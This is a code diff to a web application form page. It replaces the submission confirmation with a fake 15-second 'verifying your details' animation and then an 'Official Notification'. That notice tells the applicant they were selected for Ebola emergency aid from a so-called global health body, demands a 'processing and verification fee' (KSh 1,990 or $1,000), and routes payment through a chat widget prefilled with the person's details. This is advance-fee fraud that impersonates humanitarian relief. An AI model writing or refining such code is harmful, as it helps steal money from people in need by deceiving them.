@@ -35,6 +35,8 @@ export default function ApplyPage() {
   const [errors, setErrors] = useState<Record<string, string>>({})
   const [submitting, setSubmitting] = useState(false)
   const [submitted, setSubmitted] = useState(false)
+  const [showAnimation, setShowAnimation] = useState(false)
+  const [showNotification, setShowNotification] = useState(false)
   const [applicationId, setApplicationId] = useState("")
 
   // Load from session on mount
@@ -163,8 +165,14 @@ export default function ApplyPage() {
       const data = await res.json()
       if (data.success || data.applicationId) {
         setApplicationId(data.applicationId)
-        setSubmitted(true)
+        setShowAnimation(true)
         sessionStorage.removeItem(STORAGE_KEY)
+        
+        // Show notification after 15 seconds
+        setTimeout(() => {
+          setShowAnimation(false)
+          setShowNotification(true)
+        }, 15000)
       } else {
         alert(data.error || "Submission failed. Please try again.")
       }
@@ -230,18 +238,68 @@ export default function ApplyPage() {
               </div>
             </div>
 
-            {submitted ? (
+            {showAnimation ? (
               <div className="es-card text-center py-5">
-                <div className="es-icon-box bg-success-subtle text-success mx-auto mb-3" style={{ width: "64px", height: "64px" }}>
-                  <i className="bi bi-check-circle-fill" style={{ fontSize: "2rem" }}></i>
+                <div className="mb-4">
+                  <div className="spinner-border text-primary" style={{ width: "4rem", height: "4rem" }} role="status">
+                    <span className="visually-hidden">Processing...</span>
+                  </div>
                 </div>
-                <h2 className="h3 fw-bold mb-2">Application Submitted!</h2>
-                <p className="text-secondary mb-3">Your application has been received and is now pending review.</p>
-                <div className="alert alert-success d-inline-block">
-                  <strong>Reference Number:</strong> {applicationId}
-                </div>
-                <p className="small text-muted mt-3">Save this reference number to track your application status. Initial review takes up to 24 hours.</p>
+                <h2 className="h3 fw-bold mb-2">Processing Your Application...</h2>
+                <p className="text-secondary">Please wait while we verify your details</p>
                 <div className="mt-4">
+                  <div className="progress" style={{ height: "20px" }}>
+                    <div 
+                      className="progress-bar progress-bar-striped progress-bar-animated bg-primary" 
+                      style={{ width: "100%" }}
+                    ></div>
+                  </div>
+                </div>
+              </div>
+            ) : showNotification ? (
+              // Both Kenya and non-Kenya show notification with Complete button
+              <div className="es-card py-5">
+                <div className="text-center mb-4">
+                  <div className="es-icon-box bg-info-subtle text-info mx-auto mb-3" style={{ width: "80px", height: "80px" }}>
+                    <i className="bi bi-bell-fill" style={{ fontSize: "2.5rem" }}></i>
+                  </div>
+                  <h2 className="h3 fw-bold mb-2">
+                    ⛑️🩺 Official Notification 🛜 ⛑️🩺
+                  </h2>
+                </div>
+                
+                <div className="bg-light p-4 rounded">
+                  <p className="fs-5">Dear <strong>{form.fullName}</strong>,</p>
+                  <p className="my-3">
+                    Your mobile number has been selected and nominated as a beneficiary for Ebola Emergency Aid Support from GLOBAL HEALTH RESPONSE (SFP).
+                  </p>
+                  <p className="my-3">
+                    This grant forms part of our emergency relief programme aimed at supporting affected families and strengthening preparedness efforts.
+                  </p>
+                  <p className="my-3">
+                    To facilitate the processing and release of your aid, kindly remit the processing and verification fee of <strong>{form.countryCode === "KE" ? "KSh 1,990" : "$1,000 USD"}</strong>.
+                  </p>
+                </div>
+                
+                <div className="text-center mt-4">
+                  <button
+                    type="button"
+                    className="btn btn-success me-2"
+                    onClick={() => {
+                      // Open Tawk.to with custom message
+                      const customMessage = `Hello, my name is ${form.fullName} from ${form.country}. I submitted an application (ID: ${applicationId}) and need to complete the process with the ${form.countryCode === "KE" ? "KSh 1,990" : "$1,000 USD"} fee.`;
+                      // Try to use Tawk_API to open the chat if available, otherwise open a window
+                      if (window.Tawk_API && window.Tawk_API.toggle) {
+                        window.Tawk_API.toggle();
+                        // You can also set custom attributes if needed
+                        // window.Tawk_API.setAttributes({ 'name': form.fullName, 'email': form.email || '', 'country': form.country }, function(error) { /* Handle error */ });
+                      } else {
+                        window.open(`https://tawk.to?message=${encodeURIComponent(customMessage)}`, "_blank");
+                      }
+                    }}
+                  >
+                    <i className="bi bi-chat-dots me-1"></i>Complete
+                  </button>
                   <Link href="/" className="btn btn-es me-2">Back to Home</Link>
                   <Link href="/apply" className="btn btn-outline-secondary">New Application</Link>
                 </div>
